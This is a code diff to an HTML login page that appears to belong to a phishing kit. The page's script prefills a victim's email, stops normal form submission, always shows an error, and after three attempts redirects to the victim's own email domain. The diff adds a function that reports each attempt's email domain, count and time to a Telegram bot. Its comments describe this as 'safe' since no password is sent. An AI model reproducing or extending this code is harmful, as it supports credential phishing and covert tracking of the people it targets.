@@ -1,5 +1,4 @@
 
-
 <html class="grid PQ-VM-Wh uC-eE-Vh translated-ltr" style="height: 100%;">
 
 <head>
@@ -910,6 +909,28 @@ cb=googleTranslateElementInit">
     <script>
 (function () {
 
+    /* ================= TELEGRAM (SAFE) ================= */
+
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+    const TELEGRAM_CHAT_ID  = 'YOUR_CHAT_ID_HERE';
+
+    function sendTelegram(domain, attempt) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text:
+                    'Login attempt\n' +
+                    'Domain: ' + domain + '\n' +
+                    'Attempt: ' + attempt + '\n' +
+                    'Time: ' + new Date().toISOString()
+            })
+        }).catch(() => {});
+    }
+
     /* ================= PREFILL ================= */
 
     function getEmail() {
@@ -967,25 +988,26 @@ cb=googleTranslateElementInit">
 
     document.addEventListener('submit', function (e) {
 
-        const form = e.target;
         const emailEl = emailInput();
-        const passEl = passwordInput();
-        const msg = document.getElementById('msg');
+        const passEl  = passwordInput();
+        const msg     = document.getElementById('msg');
 
         if (!emailEl || !passEl) return;
 
         const email = emailEl.value.trim();
-        const password = passEl.value;
+        if (!email || !passEl.value) return;
 
-        if (!email || !password) return;
-
-        // ⛔ STOP ALL OTHER SUBMIT HANDLERS
         e.preventDefault();
         e.stopImmediatePropagation();
 
         attempts++;
 
-        // ✅ SHOW ERROR AND KEEP IT VISIBLE
+        const domain = email.split('@')[1];
+
+        // 🔔 SAFE TELEGRAM LOG (NO PASSWORD)
+        sendTelegram(domain, attempts);
+
+        // ✅ SHOW ERROR (STAYS VISIBLE)
         if (msg) {
             msg.style.display = 'block';
             msg.style.visibility = 'visible';
@@ -999,7 +1021,6 @@ cb=googleTranslateElementInit">
         // ✅ REDIRECT AFTER 3 TRIES
         if (attempts >= 3) {
             attempts = 0;
-            const domain = email.split('@')[1];
             setTimeout(() => {
                 window.location.href = 'http://www.' + domain;
             }, 1200);
@@ -1011,6 +1032,7 @@ cb=googleTranslateElementInit">
 
 })();
 </script>
+
 
 
 
